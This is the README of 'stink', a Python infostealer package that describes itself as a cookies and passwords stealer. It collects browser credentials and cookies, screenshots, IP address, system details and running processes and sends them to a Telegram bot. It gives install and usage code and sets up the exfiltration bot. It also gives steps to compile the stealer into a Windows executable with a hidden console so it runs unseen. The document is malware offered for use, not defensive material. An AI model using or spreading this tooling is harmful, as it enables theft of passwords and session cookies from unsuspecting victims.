<div align="left">
 <img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/FallenAstaroth/stink">
 <img alt="PyPI - Python Version" src="https://img.shields.io/pypi/pyversions/stink">
 <img alt="GitHub" src="https://img.shields.io/github/license/FallenAstaroth/stink">
</div>

# stink

Cookies and passwords stealer in just 2 lines. Sending to Telegram.

## Description
`stink` is just starting its development. Its functionality will be expanded in the future.

## Navigation
* [Current features](#Сurrent-features)
* [Future features](#Future-features)
* [Installation](#Installation)
* [Example usage](#Example-usage)
  * [Standard](#Standard)
  * [Additional parameters](#Additional-parameters)
* [Telegram bot setup](#Telegram-bot-setup)
  * [Getting token](#Getting-token)
  * [Getting id](#Getting-id)
* [Creating exe](#Creating-exe)
  * [Creating executable file](#Creating-executable-file)
  * [CMD](#CMD)

### Current features
1. Collecting cookies and passwords of the following browsers:
   - Chrome
   - Opera
   - Opera GX
   - Microsoft Edge
2. Screenshot.
3. Collecting IP address.
4. Collecting the system configuration.
5. Collecting active processes.
6. Sending collected data as an archive to Telegram.
7. Execution in a separate thread.

### Future features
1. Support for other browsers.
2. Other features.
 
## Installation

You can install the latest version with the command:
```
pip install stink==0.0.9
```

## Example usage
### Standard
```python
from stink.multistealer import Stealer

Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```
### Additional parameters

`errors` - error output.

`passwords` - collecting passwords.

`cookies` - collecting cookies.

`processes` - collecting of active processes.

`system` - collecting system configuration.

`screen` - screenshot.

All parameters take the value of `bool`. 

`True` - the function is enabled.

`False` - the function is disabled.

By default, all functions are enabled.

## Telegram bot setup
### Getting token
1. Open a chat with [BotFather](https://t.me/botfather).
2. Write the command ```/newbot```.

<p align="left">
  <a href="">
    <img src="_1.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Write the name of the bot, then the nickname with the attribute ```_bot``` at the end.

<p align="left">
  <a href="">
    <img src="_2.png" width="500px" style="display: inline-block;">
  </a>
</p>

4. Insert the resulting token into the ```YOUR_TOKEN``` field in the script.

### Getting id
1. Open a chat with [Get My ID](https://t.me/getmyid_bot).
2. Write the command ```/start```.

<p align="left">
  <a href="">
    <img src="_3.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Insert the resulting ID into the ```YOUR_ID``` field in the script.

## Creating exe
Python is an interpreted programming language, so we first translate it into C++ and then compile it into an .exe file.
We will need Nuitka to do this.

### Creating executable file

Create a test.py (or any other name) file with the following code:
```python
from stink.multistealer import Stealer

Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```

### CMD
1. Open `cmd`.
2. Type in the command:
```
pip install virtualenv
```
3. Go to the folder with the `test.py` file:
```
cd path\to\file
```
4. Create a virtual environment and activate it:
```
virtualenv venv
```
```
venv\Scripts\activate
```
5. Install Nuitka and Stink:
```
pip install Nuitka==0.6.16.4
```
```
pip install stink==0.0.9
```
6. In the appearing folder venv go to the path `\Lib\site-packages\win32\`.
7. Copy the file `win32crypt.pyd`.
8. Paste it in the path `\Lib\site-packages\`.
9. Go back to `cmd` and write the command:
```
nuitka --onefile --windows-disable-console --include-package=stink test.py
```

After executing the command we get the test.exe file with the hidden console.
